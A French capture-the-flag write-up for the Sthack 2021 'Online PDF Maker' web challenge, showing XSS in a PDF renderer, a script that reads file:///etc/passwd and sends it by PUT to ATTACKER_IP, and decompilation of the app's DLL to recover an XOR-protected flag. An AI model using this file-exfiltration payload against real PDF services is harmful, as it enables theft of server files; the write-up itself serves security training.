---
title: Web - Online PDF Maker
category: Sthack2021
author: karzemrok
tags:
- sthack2021
- web
- ctf
description: "Writeup Sthack 2021 - Online PDF Maker - WEB"
---

L'application disponible nous propose d'entrer un texte et de le transformer en PDF

![]({{site.url}}/static/upload_412dab4cc8bb5e4a25db2b393616317d.png)

Une vulnérabilité courante ici, c'est l'XSS dans le moteur de rendu du PDF. Il est possible de le vérifier avec le payload suivant:

```html
<script>
document.write('test');
</script>
```

![]({{site.url}}/static/upload_dd513641a33e58411ece557d3e82cfe2.png)

Il peut être aussi intéressant de savoir d'ou est rendu le PDF

```html
<script>
document.write(document.location);
</script>
```

![]({{site.url}}/static/upload_649b2b7457c62b1ec90c026cd3d5b20f.png)

Comme le PDF est rendu depuis un fichier (**file:///tmp/wktemp...**), nous allons pouvoir exfiltrer des fichiers. Nous pouvons par exemple extraire **/etc/passwd** de cette façon

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
    var x2 = new XMLHttpRequest();
    x2.open("PUT", 'http://ATTACKER_IP/sthack/passwd');
    x2.send(this.response)
};
x.open("GET","file:///etc/passwd");
x.responseType = 'arraybuffer';
x.send();
</script>
```

Maintenant que nous sommes en mesure de télécharger des fichiers sur la machine, il nous faut trouver des fichiers intéressants (comme les sources par exemple). Nous avons un indice dans l'HTML de l'application

![]({{site.url}}/static/upload_755639ef667bd38587be7cbcf89d83f0.png)

Nous savons que l'application est de l'ASP.net, il faut donc chercher un fichier **dll**. En tatonnant un peu, on trouve que le nom du fichier dll est le même que le copyright : `OnlinePdfMaker.dll`

Une fois la Dll décompilée avec [ILSpy](https://github.com/icsharpcode/ILSpy), on trouve ce bout de code qui semble gérer l'affichage du flag:

```csharp
string text = "";
string s = "FBMqE3MvFDkUGDM4MVUdFgAwAEA0Cj4SbwEGAQA3B1c6QhE7CAg6";
string text2 = "VGhlRmxhZ0lzU29tZXdoZXJlX3VzZV95b3VyX2JyYWlu";
text2 = text2.Substring(1, 1) + text2.Substring(1, 1) + text2.Substring(32, 1) + text2.Substring(4, 1) + text2.Substring(9, 1);
text2 += Encoding.Default.GetString(Convert.FromBase64String("ZG9uJ3RfZ3Vlc3NfbG9va19hdF90aGVfY29kZSEhXzsp"));
if (!string.Equals(keyValue, text2))
{
	text = ((keyValue != null && !keyValue.Equals("")) ? "Wrong key" : "");
}
else
{
	string text3 = EncryptModel.XORCipher(Encoding.Default.GetString(Convert.FromBase64String(s)), text2);
	text = "flag : " + text3;
}
```

Après la ligne 4, text2 à la valeur `GGbR0`. A cette valeur, on ajoute `ZG9uJ3RfZ3Vlc3NfbG9va19hdF90aGVfY29kZSEhXzsp` dans sa forme base64 décodée (`don't_guess_look_at_the_code!!_;)`)

Ensuite cette varible est utilisée en tant que clé XOR pour la valeur base64 décodée de `FBMqE3MvFDkUGDM4MVUdFgAwAEA0Cj4SbwEGAQA3B1c6QhE7CAg6`

Ce qui nous donne le flag `STHACK{W3ll_D0ne_\o/_U_f0und_Th3_c0d3!}`

On aurait aussi pu mettre `GGbR0don't_guess_look_at_the_code!!_;)` dans le paramètre `keyValue` du formulaire de génération de PDF pour voir le flag injecté dans le PDF directement.

![]({{site.url}}/static/upload_d6efbae1ee68a7ac33ac12d65656320b.png)

